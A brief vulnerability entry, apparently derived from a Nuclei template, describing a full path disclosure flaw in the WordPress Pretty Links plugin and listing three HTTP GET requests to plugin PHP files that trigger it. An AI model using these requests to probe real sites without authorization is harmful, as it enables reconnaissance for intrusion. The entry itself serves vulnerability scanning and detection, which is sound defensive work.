# Vulnerability: WordPress Pretty Links - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-pretty-links-fpd.yaml`)

## Description
WordPress Pretty Links plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/pretty-link/app/models/PrliLink.php
GET {{BaseURL}}/wp-content/plugins/pretty-link/app/controllers/PrliLinksController.php
GET {{BaseURL}}/wp-content/plugins/pretty-link/app/helpers/PrliUtils.php
```

